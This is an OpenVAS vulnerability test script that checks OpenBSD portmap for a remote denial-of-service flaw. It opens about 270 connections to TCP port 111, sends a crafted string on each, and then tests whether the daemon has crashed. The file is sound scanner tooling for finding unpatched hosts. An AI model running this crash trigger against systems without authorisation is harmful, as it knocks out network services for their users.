###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_openbsd_portmap_dos_vuln.nasl 12057 2018-10-24 12:23:19Z cfischer $
#
# OpenBSD Portmap Remote Denial of Service Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803091");
  script_version("$Revision: 12057 $");
  script_bugtraq_id(56671);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-24 14:23:19 +0200 (Wed, 24 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-12-26 10:49:16 +0530 (Wed, 26 Dec 2012)");
  script_name("OpenBSD Portmap Remote Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("secpod_rpc_portmap_tcp.nasl", "os_detection.nasl");
  script_mandatory_keys("rpc/portmap", "Host/runs_unixoide");

  script_xref(name:"URL", value:"http://secunia.com/advisories/51299/");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1027814");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/51299");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Nov/168");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2012-11/0169.html");
  script_xref(name:"URL", value:"http://www.openbsd.org/index.html");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of
  service condition.");

  script_tag(name:"affected", value:"OpenBSD version 5.2 and prior");

  script_tag(name:"insight", value:"The flaw is due to an error when handling multiple RPC requests
  and can be exploited to crash the portmap daemon via specially crafted packets
  sent to TCP port 111.");

  script_tag(name:"solution", value:"Apply the patch provided by the vendor.");

  script_tag(name:"summary", value:"This host is running portmap and is prone to denial of
  service vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

nfsPort = get_kb_item("rpc/portmap");
if(!nfsPort){
  nfsPort = 111;
}

if(!get_port_state(nfsPort)){
  exit(0);
}

soc = open_sock_tcp(nfsPort);
if(!soc){
  exit(0);
}

close(soc);

testmsg = "8========@";

for (i = 0; i < 270; i++)
{
  soc = open_sock_tcp(nfsPort);
  if(!soc){
    break;
  }
  send(socket:soc, data: testmsg);
}

if(soc){
  close(soc);
}

sleep(1);

soc2 = open_sock_tcp(nfsPort);

if(!soc2){
  security_message(port:nfsPort);
  exit(0);
}

close(soc2);

exit(99);